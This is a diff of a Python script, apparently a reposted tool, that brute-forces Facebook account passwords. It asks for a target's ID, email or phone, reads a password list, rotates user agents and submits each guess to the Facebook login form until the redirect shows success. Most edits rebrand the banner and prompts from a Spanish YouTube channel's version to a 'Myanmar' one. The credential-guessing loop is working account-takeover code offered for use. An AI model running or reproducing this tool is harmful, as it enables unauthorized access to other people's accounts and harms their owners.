@@ -40,29 +40,14 @@ def cover():
     
     
      """
-    runntek(GL+"           YouTube'@TecnoSolution ^_^...")
-    time.sleep(1)
-    print " "
-    print RR+"  +============================================+"
-    print GG+"  |¢â€€   HACK FACEBOOK By TecnoSolution   ¢â€¢|"
-    print RR+"  +============================================+"
-    print WW+"  |            Script BY: TecnoSolution        |"
-    print GG+"  |              Reza antes de usar            |"
-    print WW+"  |            FACEBOOK: TecnoSolution         |"
-    print Y+"   |             YouTube: TecnoSolution         |"
-    print WW+"  |--------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]        |"
-    print WW+"  |--------------------------------------------|"
-    print RR+"  +============================================+"
-    print GG+"  |¢â€€   HACK FACEBOOK By TecnoSolution   ¢â€¢|"
-    print RR+"  +============================================+"     
-
+    runntek(GG+"          Welcome To Myanmar")
+    runntek(GG+ "         FACEBOOK HACKING")
 
 cover()
 
-email = str(raw_input(GL+" â€¢Introduzca la ID del objetivo\033[33;1m: "))
+email = str(raw_input(GG+" ID GMAIL PHONE USARNAME\033[33;1m: "))
 
-passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass.txt, pass1.txt, pass2.txt, pass3.txt ] \033[92;1m: "))
+passwordlist = str(raw_input(WW+"ENDER Password.txt\033[92;1m: "))
 
 
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
@@ -109,7 +94,7 @@ def kol():
     else:
         exit(0)
 def brute(password):
-        sys.stdout.write(GG+"\r[+]\033[97;1m Probando ..... {}\n".format(password))
+        sys.stdout.write(GG+"\r[+]\033[31;1m ✗Faults✗\033[37;1m ...... {}\033[37;1m\n".format(password))
         sys.stdout.flush()
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
@@ -119,7 +104,7 @@ def brute(password):
         sub = br.submit()
         log = sub.geturl()
         if log != login and (not 'login_attempt' in log):
-                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
+                        print("\033[92;1m\n\n[✔]\033[32;1m Password Accurately \033[31;1m===| \033[96;1m{}".format(password)) 
                         print " "
                         raw_input(WW+"PULSE ENTER PARA SALIR.....")
                         sys.exit(1)
@@ -135,13 +120,7 @@ def search():
 
 #welcome
 def welcome():
-        wel = GG+"""
-No olvides suscribirte al Canal de Youtube "TecnoSolution" 
-Y darle LIKE al Video.... Gracias!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
-       |_|
-      """
-        print wel
+        
         print " "
         total = open(passwordlist,"r")
         total = total.readlines()
